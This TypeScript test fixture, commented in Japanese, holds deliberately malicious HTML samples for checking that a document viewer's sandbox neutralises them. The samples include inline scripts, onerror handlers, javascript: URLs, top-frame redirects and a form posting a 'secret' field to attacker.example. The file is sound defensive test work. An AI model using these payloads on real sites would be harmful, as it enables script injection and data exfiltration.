/**
 * ビューアの隔離を試すための、意図的に危険な HTML（14.3）。
 *
 * これらは「文書リポジトリ側の検証をすり抜けた場合でも表示側で無害化できるか」を
 * 確かめるためのもの。単体テストと Playwright の双方から使う。
 */

export const MALICIOUS_DOCUMENTS = {
  /** script が実行されないこと。 */
  inlineScript: `<!doctype html><html><head><title>script</title></head><body>
<p id="marker">before</p>
<script>document.getElementById('marker').textContent = 'script-executed';</script>
</body></html>`,

  /** 読み込み失敗を利用した onerror が動かないこと。 */
  // タイトルに属性名そのものを書かない。検証時に属性と区別できなくなるため。
  onErrorHandler: `<!doctype html><html><head><title>イベント属性</title></head><body>
<img src="data:image/png;base64,INVALID" onerror="window.top.location='https://attacker.example/'">
<div onclick="alert(1)" onmouseover="alert(2)">クリック</div>
</body></html>`,

  /** 親フレームへ触れないこと。 */
  parentAccess: `<!doctype html><html><head><title>parent</title></head><body>
<script>
  try { parent.document.title = 'leaked'; } catch (error) { /* サンドボックスでは失敗する */ }
  try { top.location.href = 'https://attacker.example/'; } catch (error) { /* 同上 */ }
</script>
</body></html>`,

  /** 外部の画像を取りに行かないこと。 */
  externalImage: `<!doctype html><html><head><title>external image</title></head><body>
<img src="https://attacker.example/pixel.png" alt="">
<img srcset="https://attacker.example/a.png 1x, https://attacker.example/b.png 2x" alt="">
<picture><source srcset="https://attacker.example/c.webp"><img src="https://attacker.example/d.png" alt=""></picture>
</body></html>`,

  /** 外部のスタイルシートを取りに行かないこと。 */
  externalStylesheet: `<!doctype html><html><head><title>external css</title>
<link rel="stylesheet" href="https://attacker.example/style.css">
<style>@import url("https://attacker.example/imported.css");
body { background-image: url(https://attacker.example/bg.png); }</style>
</head><body><p>本文</p></body></html>`,

  /** フォームを送信できないこと。 */
  formSubmission: `<!doctype html><html><head><title>form</title></head><body>
<form action="https://attacker.example/collect" method="post">
  <input name="secret" value="x">
  <button type="submit">送信</button>
</form>
</body></html>`,

  /** 最上位のナビゲーションが起きないこと。 */
  topNavigation: `<!doctype html><html><head><title>top navigation</title></head><body>
<a href="https://attacker.example/" target="_top" id="link">移動</a>
<meta http-equiv="refresh" content="0;url=https://attacker.example/">
</body></html>`,

  /** javascript: URL が無効化されること。 */
  javascriptUrl: `<!doctype html><html><head><title>javascript url</title></head><body>
<a href="javascript:document.title='executed'" id="jsurl">実行</a>
<img src="javascript:alert(1)" alt="">
</body></html>`,

  /** iframe や object を埋め込めないこと。 */
  nestedFrames: `<!doctype html><html><head><title>frames</title></head><body>
<iframe src="https://attacker.example/"></iframe>
<object data="https://attacker.example/x.swf"></object>
<embed src="https://attacker.example/y.swf">
</body></html>`,

  /** base を差し替えて相対URLを外部へ向けられないこと。 */
  baseTag: `<!doctype html><html><head><title>base</title>
<base href="https://attacker.example/"></head><body>
<img src="relative.png" alt="">
</body></html>`,

  /** 許可された表現は残ること（過剰な除去をしていないかの確認）。 */
  benign: `<!doctype html><html><head><title>安全な文書</title>
<style>body { color: #123456; } .box > p { margin: 0; }</style></head><body>
<h1>見出し</h1>
<div class="box"><p>本文</p></div>
<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" alt="小さな画像">
<a href="#section">ページ内リンク</a>
<h2 id="section">節</h2>
<svg viewBox="0 0 10 10"><rect width="10" height="10" fill="#4da3ff"/></svg>
</body></html>`,
} as const;

export type MaliciousDocumentKey = keyof typeof MALICIOUS_DOCUMENTS;
